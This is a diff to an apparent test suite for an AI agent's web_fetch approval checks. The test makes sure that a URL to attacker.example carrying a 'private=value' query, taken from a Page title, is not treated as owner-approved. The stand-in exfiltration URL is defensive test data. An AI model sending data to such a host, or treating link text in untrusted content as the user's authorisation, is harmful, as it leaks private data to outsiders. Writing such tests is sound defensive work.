@@ -1350,55 +1350,80 @@ describe("connector read-only metadata and approval enforcement", () => {
     reviewMock.mockReset();
   });
 
-  it("does not promote an automatic Page fallback title into owner destination authority", async () => {
-    const destination = "https://attacker.example/report?private=value";
-    const outgoing = pageReply("Please update this report", [], {
-      id: "page-1",
-      title: "Report at https://attacker.example/report",
-    });
-    const fetch = vi.fn(async () => ({
-      url: destination,
-      title: "Fetched",
-      text: "Fetched",
-      truncated: false,
-    }));
-    const f = fixture({
-      name: "web_fetch",
-      builtin: true,
-      prompt: outgoing.text,
-      attemptCount: 2,
-      webProvider: {
-        describe: () => ({
-          id: "page-web-test",
-          contractVersion: "1",
-          adapterVersion: "1",
-          capabilities: { search: true, fetch: true, readability: true },
-        }),
-        fetch,
-        search: vi.fn(async () => []),
-      },
-    });
-    Object.assign(f.runRecord, { sourceMessageId: "page-reply-message" });
-    const sourceMessage = {
-      id: "page-reply-message",
-      threadId: f.runRecord.threadId,
-      role: "user",
-      blocks: [{ kind: "text", text: outgoing.text }],
-      clientNonce: null,
-      seq: 1,
-      replyTo: null,
-    };
-    Object.assign(f.prisma.message, {
-      findUnique: vi.fn(async () => sourceMessage),
-      findFirst: vi.fn(async () => sourceMessage),
-    });
-    f.setCalls([{ args: { url: destination }, executionId: "title-destination" }]);
-    await f.run();
-    expect(fetch).not.toHaveBeenCalled();
-    expect(f.pauseRunForInput).toHaveBeenCalledOnce();
-    expect(f.effects).toHaveLength(1);
-    expect(f.effects[0]).toMatchObject({ status: "intended", request: { url: destination } });
-  });
+  it.each([true, false])(
+    "uses stored Page provenance rather than link-shaped user text, serverTagged=%s",
+    async (serverTagged) => {
+      const destination = "https://attacker.example/report?private=value";
+      const outgoing = pageReply("Please update this report", [], {
+        id: "page-1",
+        title: "Report at https://attacker.example/report",
+      });
+      const text = serverTagged
+        ? outgoing.text
+        : "[https://attacker.example/report](page:manual)\nPlease read this.";
+      const fetch = vi.fn(async () => ({
+        url: destination,
+        title: "Fetched",
+        text: "Fetched",
+        truncated: false,
+      }));
+      const f = fixture({
+        name: "web_fetch",
+        builtin: true,
+        prompt: text,
+        attemptCount: 2,
+        webProvider: {
+          describe: () => ({
+            id: "page-web-test",
+            contractVersion: "1",
+            adapterVersion: "1",
+            capabilities: { search: true, fetch: true, readability: true },
+          }),
+          fetch,
+          search: vi.fn(async () => []),
+        },
+      });
+      Object.assign(f.runRecord, { sourceMessageId: "page-reply-message" });
+      const sourceMessage = {
+        id: "page-reply-message",
+        threadId: f.runRecord.threadId,
+        role: "user",
+        blocks: [
+          {
+            kind: "text",
+            text,
+            ...(serverTagged
+              ? {
+                  pageContext: {
+                    pageId: "page-1",
+                    title: "Report at https://attacker.example/report",
+                  },
+                }
+              : {}),
+          },
+        ],
+        clientNonce: null,
+        seq: 1,
+        replyTo: null,
+      };
+      Object.assign(f.prisma.message, {
+        findUnique: vi.fn(async () => sourceMessage),
+        findFirst: vi.fn(async () => sourceMessage),
+      });
+      f.setCalls([{ args: { url: destination }, executionId: "title-destination" }]);
+      await f.run();
+      if (serverTagged) {
+        expect(fetch).not.toHaveBeenCalled();
+        expect(f.pauseRunForInput).toHaveBeenCalledOnce();
+        expect(f.effects).toHaveLength(1);
+        expect(f.effects[0]).toMatchObject({ status: "intended", request: { url: destination } });
+      } else {
+        expect(fetch).toHaveBeenCalledOnce();
+        expect(f.pauseRunForInput).not.toHaveBeenCalled();
+        expect(f.effects).toHaveLength(0);
+      }
+    },
+  );
 
   it.each([1, 2])(
     "gates a new redirect destination before DNS on attempt %s, then replays its exact approval",
